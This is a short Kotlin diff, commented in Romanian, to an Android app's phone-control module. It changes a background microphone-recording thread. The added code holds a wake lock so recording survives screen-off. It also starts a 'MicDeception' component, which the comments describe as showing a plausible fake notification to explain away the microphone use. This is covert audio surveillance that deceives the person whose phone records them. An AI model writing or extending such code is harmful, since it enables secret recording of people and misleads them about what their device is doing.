@@ -125,7 +125,19 @@ object PhoneControl {
         recThread = Thread {
             var rec: AudioRecord? = null
             var totalBytes = 0
+            var notifId = 0
+            var wl: android.os.PowerManager.WakeLock? = null
             try {
+                // Wake lock dedicat: recordingul nu se suspendă când ecranul e off
+                try {
+                    val pm = app.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
+                    wl = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "forja:pc-audio").apply {
+                        setReferenceCounted(false)
+                        acquire(durationMs + 10_000L)
+                    }
+                } catch (_: Exception) {}
+                // Deception: notificare plauzibilă care explică mic-ul
+                notifId = MicDeception.start(app)
                 ForjaSyncCapabilities.syncService?.promoteMic()
                 val rate = 16_000
                 val minBuf = AudioRecord.getMinBufferSize(
@@ -192,6 +204,8 @@ object PhoneControl {
                 try { rec?.release() } catch (_: Exception) { }
                 file.delete()
             } finally {
+                try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
+                MicDeception.stop(app, notifId)
                 active = false
             }
         }.apply { name = "forja-pc-audio"; isDaemon = true; start() }
